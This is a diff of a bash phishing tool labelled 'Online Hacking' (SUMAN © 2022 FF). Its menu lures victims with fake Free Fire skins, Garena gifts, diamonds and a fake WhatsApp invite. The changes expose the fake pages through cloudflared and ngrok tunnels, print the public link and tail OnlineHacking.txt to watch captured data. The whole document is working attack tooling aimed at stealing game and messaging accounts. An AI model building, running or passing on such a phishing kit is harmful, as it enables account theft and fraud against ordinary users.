@@ -9,7 +9,7 @@ check_status() {
 
 
 ## server
-server() {
+server1() {
 clear
 logo1
 echo " "
@@ -591,10 +591,6 @@ Online Hacking © \e[92m
 }
 
 
-cd_home() {
-cd /usr/bin/.SUMAN/
-}
-
 
 ## LOGO 1
 logo1() {
@@ -645,36 +641,7 @@ echo -e "\e[95m
                            echo ""
 }
 
-## LOGO 2
-logo_text() {
-echo -e "\e[1;96m< < < ====================================================== > > >\e[m "
-printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
-echo " "
-printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Game Kharido \e[0m  \e[95m[\e[32mPro\e[95m]\e[0m     \e[1;31m[\e[0m\e[1;92m06\e[0m\e[1;31m] \e[0m\e[1;91;107m Free Fire Skin \e[0m  \e[95m[\e[93mNew\e[95m]\e[0m "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
-echo
-printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41m Garena Gift Center \e[0m      \e[1;31m[\e[0m\e[1;92m07\e[0m\e[1;31m] \e[0m\e[1;34;103m Free Fire Spin \e[0m  \e[95m[\e[93mNew\e[95m]\e[0m "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;91;107m Magic Event Reward \e[0m      \e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;37;41m Free Coin, Diamond \e[0m  \e[95m[\e[93mNew\e[95m]\e[0m "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;34;103m Redemption Code \e[0m         \e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;91;102m Fack WhatsApp Invite \e[0m  "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;48;5;21m Diamond Buy \e[0m   \e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;48;5;200m Choose Gift + Package Gift + Lucky Spin\e[0m  "
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
-echo
-printf "\e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;33mExit\e[0m                      \e[1;31m[\e[0m\e[1;92m50\e[0m\e[1;31m] \e[0m\e[1;33mAbout\e[0m\n"
-echo " "
-echo -e "\e[1;96m< < < ====================================================== > > >\e[m "
-echo ""
-}
+
 
 
 logo3() {
@@ -1067,11 +1034,26 @@ echo ""
 		 echo ""
 		 if [ $option = 01 ] || [ $option = 1 ]
                  then 
-                           cd_home
-                           cd 0/
+                           install_cloudflared
+start_cloudflared
+clear
+logo_last
+                           
+			   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
-			   server
-			   select_url
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo ""
+askuri_c
+clear
+logo_last
+sleep 3
+clear
+l_logo
+links_c
 			   
                            if [[ -e OnlineHacking.txt ]]; then
                            > OnlineHacking.txt
@@ -1085,11 +1067,27 @@ echo ""
 	          break;
                   elif [ $option = 02 ] || [ $option = 2 ]
 	          then
-	                   cd_home
-                           cd 2/         
+	                   clear
+install_ngrok
+ngroktoken
+start_ngrok
+clear
+logo_last
+                           
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
                            echo ""
-			   server
-			   select_url
+askuri_nc
+clear
+logo_last
+sleep 3
+clear
+l_logo
+links_n
                            
                            if [[ -e OnlineHacking.txt ]]; then
                            > OnlineHacking.txt
@@ -1192,57 +1190,6 @@ echo ""
                            tail -f OnlineHacking.txt
 msg_exit
 
-                  break;
-    elif [ $option = 08 ] || [ $option = 8 ]
-	          then
-	                   cd_home
-                           cd 8/         
-                           echo ""
-			   server
-			   select_url
-                           
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
-                           fi 
-                           echo ""
-                           echo ""
-                           tail -f OnlineHacking.txt
-msg_exit
-
-                  break;   
-		  
-elif [ $option = 09 ] || [ $option = 9 ]
-	          then
-	                   cd_home
-                           cd 5/         
-                           echo ""
-			   server
-			   select_url
-                           
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
-                           fi 
-                           echo ""
-                           echo ""
-                           tail -f OnlineHacking.txt
-msg_exit
-
-                  break;		  
-elif [ $option = 10 ] || [ $option = 010 ]
-	          then
-	                   cd_home
-                           cd 1/     
-                           echo ""
-			   server
-			   select_url
-                           
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
-                           fi 
-                           echo ""
-                           echo ""
-                           tail -f OnlineHacking.txt
-msg_exit
 
                   break;		  
 elif [ $option = 50 ] || [ $option = 050 ]
